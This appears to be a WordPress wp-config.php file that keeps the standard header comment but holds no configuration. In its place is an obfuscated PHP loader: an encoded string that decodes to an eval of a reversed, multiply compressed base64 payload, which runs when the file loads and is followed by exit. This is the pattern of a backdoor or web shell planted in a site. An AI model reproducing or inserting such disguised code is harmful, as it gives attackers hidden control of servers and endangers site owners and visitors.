<?php
/**
* The base configuration for WordPress
*
* The wp-config.php creation script uses this file during the
* installation. You don't have to use the web site, you can
* copy this file to "wp-config.php" and fill in the values.
*
* This file contains the following configurations:
*
* * MySQL settings
* * Secret keys
* * Database table prefix
* * ABSPATH
*
* @link https://codex.wordpress.org/Editing_wp-config.php
*
* @package WordPress
*/


$unknown = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNHVrNDUlMjklMjklMjklMjklMjklMjklMjklMjklM0I=";
$uk45 = "=4XfxakOAGnuXEu+ev51cjJ5XfS5e5lX2WIO/ToIUKnbnCA3BkNF5MM9UcYmNJbxNNbVo1sKybfuuF4TmlJ/qSPlWlXQsUaL3LvXKfjmsIbs/tJyQgGUKNdNbVn7CKITMB46Ew7Xervci4choRHSsmD/ohP4bl7ac9QGItQGeIVBmFL+kQJ7DDCdvNujBYUU6SfMg55DqkjGrhCBg1uFEp1oNxQ+7C+IJw3tcRKHvWk6kpA95qxyjL+40O9bnDwOFq39Ul18z561vj3H5RO4wFS2Lw8Xm19/KmyUaKxQGQpsSsawbhk5QJqmoc+V9WmCIBFZ/weHvaIFwM8Sd9Yhci3/DAA/BwJe+jfAHEg/zHADB4v7BERA";
eval(htmlspecialchars_decode(urldecode(base64_decode($unknown))));
exit;
?>